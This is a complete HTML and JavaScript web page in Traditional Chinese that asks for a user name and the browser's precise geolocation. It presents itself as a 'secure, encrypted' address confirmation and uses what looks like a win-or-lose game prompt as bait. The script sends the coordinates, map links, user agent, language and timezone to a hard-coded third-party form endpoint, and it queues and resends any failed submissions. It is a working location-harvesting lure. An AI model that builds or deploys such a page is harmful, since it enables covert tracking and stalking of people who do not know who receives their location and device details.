<!doctype html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>獲取定位 · 安全上傳（Pro）</title>
  <meta name="description" content="一鍵安全傳送座標，離線重試、錯誤中文化、分享地圖連結。" />
  <meta name="color-scheme" content="light dark" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+TC:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    :root{
      --bg:#0b0b12;--bg2:#0f1020;--ink:#eaeaff;--muted:#a6a6c9;--accent:#8b7bff;--accent-2:#ffe94d;--success:#42d392;--danger:#ff6b6b;--ring:0 0 0 .12rem rgba(139,123,255,.45),0 0 1.4rem rgba(139,123,255,.35);--shadow:0 10px 40px rgba(0,0,0,.35);--radius:16px
    }
    *{box-sizing:border-box}
    body{margin:0;min-height:100svh;font-family:"Noto Sans TC","Inter",system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,"Helvetica Neue",sans-serif;color:var(--ink);background:linear-gradient(180deg,var(--bg),var(--bg2));display:grid;place-items:center}
    .wrap{width:min(760px,94vw);background:rgba(255,255,255,.08);border-radius:var(--radius);padding:24px 22px;box-shadow:var(--shadow);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.08)}
    h1{margin:0 0 10px;font-size:clamp(20px,3.6vw,28px)}
    p.lead{color:var(--muted);margin:0 0 16px}
    .grid{display:grid;gap:12px}
    .grid-2{grid-template-columns:1fr}
    @media (min-width:600px){.grid-2{grid-template-columns:1fr 1fr}}
    label{font-weight:700;font-size:.95rem}
    input,select{width:100%;padding:12px 14px;border-radius:12px;border:1px solid rgba(255,255,255,.2);background:rgba(255,255,255,.05);color:var(--ink);outline:none;transition:box-shadow .2s,border-color .2s}
    input:focus,select:focus{box-shadow:var(--ring);border-color:rgba(139,123,255,.55)}
    .actions{display:grid;gap:10px;margin-top:6px}
    button{width:100%;padding:14px;font-size:1.05rem;border:none;border-radius:14px;font-weight:800;cursor:pointer;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#0f0f17;transition:transform .06s ease,filter .2s ease,opacity .25s}
    button.ghost{background:transparent;border:1px dashed rgba(255,255,255,.25);color:var(--ink)}
    button:disabled{opacity:.5;cursor:not-allowed}
    button:active{transform:translateY(1px)}
    .row-inline{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
    .status{margin-top:12px;font-weight:800;color:var(--muted);white-space:pre-line}
    .ok{color:var(--success)}.bad{color:var(--danger)}
    .tip{font-size:.9rem;color:var(--muted);margin-top:6px}
    .result{margin-top:14px;display:grid;gap:8px}
    .card{padding:12px;border:1px solid rgba(255,255,255,.13);border-radius:14px;background:rgba(255,255,255,.06)}
    .kv{display:grid;grid-template-columns:110px 1fr;gap:6px;align-items:center}
    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
    .pill{display:inline-flex;align-items:center;gap:6px;padding:4px 10px;border-radius:999px;background:rgba(255,255,255,.08);font-size:.85rem}
    .sr{position:absolute;left:-9999px}
    .toast{position:fixed;inset:auto 12px 12px auto;background:rgba(0,0,0,.7);color:#fff;padding:8px 12px;border-radius:10px;opacity:0;transform:translateY(8px);transition:opacity .2s,transform .2s}
    .toast.show{opacity:1;transform:translateY(0)}
  </style>
</head>
<body>
  <main class="wrap" role="main">
    <h1>確認地址 ⬇️</h1>
    <p class="lead">輸入名稱並授權定位，系統會<strong>加密傳送</strong>座標與地圖連結。常見錯誤會自動中文化。</p>

    <div class="grid grid-2" style="align-items:end">
      <div>
        <label for="username">使用者名稱</label>
        <input id="username" placeholder="請輸入使用者名稱" autocomplete="username" />
        <div class="tip" id="nameTip">會自動記住你上次輸入的名稱</div>
      </div>
      <div>
        <label for="mapProvider">地圖服務</label>
        <select id="mapProvider">
          <option value="auto">自動（iOS→Apple / 其他→Google）</option>
          <option value="google">Google Maps</option>
          <option value="apple">Apple 地圖</option>
          <option value="osm">OpenStreetMap</option>
        </select>
      </div>
    </div>

    <div class="actions">
      <div class="grid grid-2">
        <button id="sendLocationBtn" disabled>📍 傳送地址</button>
        <button id="retryBtn" class="ghost" disabled>重新嘗試</button>
      </div>
      <div class="row-inline">
        <button id="shareBtn" class="ghost" disabled>分享連結</button>
        <span class="pill">精度：<span id="accVal">—</span> m</span>
      </div>
    </div>

    <div id="status" class="status" aria-live="polite">想輸贏請先輸入名稱再點擊上方按鍵！</div>

    <section id="result" class="result" hidden>
      <div class="card">
        <div class="kv"><strong>緯度</strong><span id="latText" class="mono">—</span></div>
        <div class="kv"><strong>經度</strong><span id="lngText" class="mono">—</span></div>
        <div class="kv"><strong>座標</strong><span id="coords" class="mono">—</span></div>
      </div>
      <div class="row-inline">
        <button id="copyLat" class="ghost" disabled>複製緯度</button>
        <button id="copyLng" class="ghost" disabled>複製經度</button>
        <button id="copyBoth" class="ghost" disabled>複製座標</button>
        <a id="mapLink" class="pill" href="#" target="_blank" rel="noopener">在地圖查看 ↗</a>
        <a id="altMapLink" class="pill" href="#" target="_blank" rel="noopener">備用地圖 ↗</a>
      </div>
    </section>
  </main>

  <div id="toast" class="toast" role="status" aria-live="assertive"></div>

  <script>
    // ====== DOM ======
    const $ = sel => document.querySelector(sel);
    const usernameInput = $('#username');
    const mapProviderSel = $('#mapProvider');
    const btnSend = $('#sendLocationBtn');
    const btnRetry = $('#retryBtn');
    const btnShare = $('#shareBtn');
    const statusEl = $('#status');
    const result = $('#result');
    const latText = $('#latText');
    const lngText = $('#lngText');
    const coordsEl = $('#coords');
    const accVal = $('#accVal');
    const copyLatBtn = $('#copyLat');
    const copyLngBtn = $('#copyLng');
    const copyBothBtn = $('#copyBoth');
    const mapLink = $('#mapLink');
    const altMapLink = $('#altMapLink');
    const toast = $('#toast');

    // ====== 設定 ======
    const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xnndkpja';
    const CLICK_COOLDOWN_MS = 1200; // 防止連點

    // ====== 小工具 ======
    const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
    function showToast(msg){ toast.textContent = msg; toast.classList.add('show'); setTimeout(()=>toast.classList.remove('show'), 1600); }
    function setLoading(loading){
      btnSend.disabled = loading || usernameInput.value.trim()==='';
      btnRetry.disabled = loading || usernameInput.value.trim()==='';
      btnShare.disabled = loading;
      btnSend.textContent = loading ? '傳送中…' : '📍 傳送地址';
    }

    function isIOS(){ return /iP(hone|od|ad)/.test(navigator.platform) || /iOS|iPhone|iPad|iPod/.test(navigator.userAgent); }

    function buildMapUrls(lat,lng,provider){
      const g = `https://maps.google.com/?q=${lat},${lng}&ll=${lat},${lng}&z=18`;
      const a = `https://maps.apple.com/?ll=${lat},${lng}&q=${lat},${lng}`;
      const o = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}#map=18/${lat}/${lng}`;
      let primary=g, secondary=o;
      if (provider==='apple' || (provider==='auto' && isIOS())){ primary=a; secondary=g; }
      if (provider==='osm'){ primary=o; secondary=g; }
      if (provider==='google'){ primary=g; secondary=o; }
      return {primary, secondary, google:g, apple:a, osm:o};
    }

    function revealResult(lat,lng,acc,provider){
      latText.textContent = lat.toFixed(6);
      lngText.textContent = lng.toFixed(6);
      coordsEl.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
      accVal.textContent = acc ? Math.round(acc) : '—';
      const {primary, secondary} = buildMapUrls(lat,lng,provider);
      mapLink.href = primary; altMapLink.href = secondary; result.hidden = false;
      [copyLatBtn, copyLngBtn, copyBothBtn].forEach(b=>b.disabled=false);
      btnShare.disabled = !(navigator.share || navigator.canShare);
      if (acc && acc > 100){ statusEl.textContent = `定位成功，但精度較差（約 ${Math.round(acc)} 公尺），建議到空曠處重試。`; statusEl.className='status'; }
    }

    // ====== 錯誤中文化 ======
    function geoErrorToZh(err){
      const mapByCode={1:'權限被拒絕：請允許本網站使用定位權限。',2:'無法取得位置：裝置未回報座標或沒有可用的定位來源。',3:'逾時：定位花太久，請移動到較開闊處或稍後重試。'};
      if (typeof err?.code==='number' && mapByCode[err.code]) return mapByCode[err.code];
      const msg=(err?.message||'').toLowerCase();
      if (msg.includes('only secure origins')||location.protocol!=='https:') return '需使用 HTTPS 安全連線才可定位，請改用 https:// 網址。';
      if (msg.includes('permission')&&msg.includes('denied')) return '你拒絕了定位權限，請在瀏覽器網站權限把「位置」改為允許。';
      if (msg.includes('timeout')) return '定位逾時，訊號或環境可能不佳，請移動到空曠處再試。';
      if (msg.includes('unavailable')) return '目前無法取得位置，可能是裝置沒有 GPS 或尚未啟用。';
      return '定位失敗：'+(err?.message||'不明錯誤');
    }
    function networkErrorToZh(err){
      const msg=(err?.message||'').toLowerCase();
      if (msg.includes('failed to fetch')) return '網路請求失敗：可能離線、CORS 或伺服器無回應。';
      if (msg.includes('cors')) return 'CORS 限制：請確認伺服器允許本網域發送請求。';
      return '送出失敗：'+(err?.message||'不明錯誤');
    }
    function httpStatusToZh(status){
      const m={400:'錯誤的請求（400）：請檢查送出的資料格式。',401:'未授權（401）：請確認伺服器金鑰或授權設定。',403:'被拒絕（403）：你沒有權限呼叫此端點。',404:'找不到資源（404）：請確認端點 URL 是否正確。',413:'內容太大（413）：傳送資料超過伺服器允許上限。',429:'請求過多（429）：呼叫太頻繁，請稍後再試。',500:'伺服器錯誤（500）：伺服器發生問題。',502:'閘道錯誤（502）：上游服務異常。',503:'服務不可用（503）：伺服器忙碌或維護中。',504:'逾時（504）：伺服器回應逾時。'};
      return m[status]||`送出失敗（HTTP ${status}）`;
    }

    async function postJSON(url,data){
      try{
        const res = await fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify(data)});
        if(!res.ok) throw new Error(httpStatusToZh(res.status));
        return true;
      }catch(err){ throw new Error(networkErrorToZh(err)); }
    }

    // ====== 離線佇列（自動補送） ======
    const QUEUE_KEY='geo_queue_v1';
    function enqueue(record){
      const q = JSON.parse(localStorage.getItem(QUEUE_KEY)||'[]');
      q.push(record); localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
    }
    async function flushQueue(){
      let q = JSON.parse(localStorage.getItem(QUEUE_KEY)||'[]');
      if(!q.length) return;
      statusEl.textContent = `偵測到 ${q.length} 筆待補送資料，嘗試上傳中…`; statusEl.className='status';
      const remain=[];
      for(const item of q){
        try{ await postJSON(FORMSPREE_ENDPOINT,item); }
        catch{ remain.push(item); }
        await sleep(200);
      }
      localStorage.setItem(QUEUE_KEY, JSON.stringify(remain));
      if(remain.length===0){ showToast('離線資料已全部補送 ✔'); }
    }
    window.addEventListener('online', flushQueue);

    // ====== 主流程 ======
    let lastClick=0;
    async function sendLocationFlow(){
      const now=Date.now(); if(now-lastClick < CLICK_COOLDOWN_MS) return; lastClick=now;
      if(!('geolocation' in navigator)){
        statusEl.textContent='抱歉，瀏覽器不支援定位功能。建議改用 Chrome / Safari / Edge 並確保 HTTPS。'; statusEl.className='status bad'; return;
      }
      const name=usernameInput.value.trim();
      if(!name){ statusEl.textContent='請先輸入使用者名稱～'; statusEl.className='status bad'; return; }

      setLoading(true);
      const provider=mapProviderSel.value;
      const geoOpts={ enableHighAccuracy:true, timeout:15000, maximumAge:0 };

      navigator.geolocation.getCurrentPosition(async pos=>{
        const {latitude, longitude, accuracy}=pos.coords;
        const urls = buildMapUrls(latitude, longitude, provider);
        const payload={
          username:name,
          latitude, longitude, accuracy,
          maps_url_primary: urls.primary,
          maps_url_secondary: urls.secondary,
          maps_url_google: urls.google,
          maps_url_apple: urls.apple,
          maps_url_osm: urls.osm,
          latlng:`${latitude}, ${longitude}`,
          userAgent:navigator.userAgent,
          language:navigator.language,
          timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
          online:navigator.onLine,
          timestamp:new Date().toISOString()
        };

        try{
          if(!navigator.onLine){ enqueue(payload); showToast('目前離線，已加入佇列'); }
          else{ await postJSON(FORMSPREE_ENDPOINT,payload); }

          revealResult(latitude, longitude, accuracy, provider);
          mapLink.href = urls.primary; altMapLink.href = urls.secondary;

          statusEl.textContent=`✓ 已送出：${name}`; statusEl.className='status ok';
          localStorage.setItem('geo_name', name);
        }catch(err){
          revealResult(latitude, longitude, accuracy, provider);
          enqueue(payload); // 失敗也先排隊，等線上再補送
          statusEl.textContent=String(err.message||err); statusEl.className='status bad';
        }finally{ setLoading(false); }
      }, err=>{
        statusEl.textContent=geoErrorToZh(err); statusEl.className='status bad'; setLoading(false);
      }, geoOpts);
    }

    // ====== 分享 ======
    async function shareCurrent(){
      const text=`${usernameInput.value.trim()} 的位置：
${coordsEl.textContent}
`;
      const url=mapLink.href;
      if(navigator.share){
        try{ await navigator.share({ title:'我的位置', text, url }); }catch{/* user canceled */}
      }else{
        try{ await navigator.clipboard.writeText(text+url); showToast('已複製分享文字與連結'); }catch{ showToast('分享失敗，請手動複製'); }
      }
    }

    // ====== 權限偵測 ======
    async function initPermissionHints(){
      try{
        if(!('permissions' in navigator)) return;
        const q = await navigator.permissions.query({ name:'geolocation' });
        const set=(msg,cls='status')=>{ statusEl.textContent=msg; statusEl.className=cls; };
        if(q.state==='denied') set('定位權限為「拒絕」。請在瀏覽器網站權限將「位置」改為允許後再重試。','status bad');
        else if(q.state==='prompt') set('送出時會詢問定位權限，請點允許以取得座標。');
        else if(q.state==='granted') set('定位權限已允許，輸入名稱後即可傳送。','status ok');
        q.onchange=()=>initPermissionHints();
      }catch{}
    }

    // ====== 事件綁定 ======
    usernameInput.addEventListener('input', ()=>{
      const hasName=usernameInput.value.trim()!==''; btnSend.disabled=!hasName; btnRetry.disabled=!hasName;
    });
    btnSend.addEventListener('click', sendLocationFlow);
    btnRetry.addEventListener('click', sendLocationFlow);
    btnShare.addEventListener('click', shareCurrent);

    async function copy(text,msg){ try{ await navigator.clipboard.writeText(text); showToast(msg); }catch{ showToast('複製失敗'); } }
    copyLatBtn.addEventListener('click',()=>copy(latText.textContent,'已複製緯度'));
    copyLngBtn.addEventListener('click',()=>copy(lngText.textContent,'已複製經度'));
    copyBothBtn.addEventListener('click',()=>copy(coordsEl.textContent,'已複製座標'));

    // ====== 初始化 ======
    (function init(){
      if(location.protocol!=='https:' && location.hostname!=='localhost'){
        statusEl.textContent='⚠ 目前不是 HTTPS 連線，瀏覽器可能會擋定位。請改用 https:// 網址。'; statusEl.className='status bad';
      }
      const saved=localStorage.getItem('geo_name'); if(saved){ usernameInput.value=saved; btnSend.disabled=false; btnRetry.disabled=false; }
      initPermissionHints();
      if(navigator.onLine) flushQueue();
    })();
  </script>
</body>
</html>
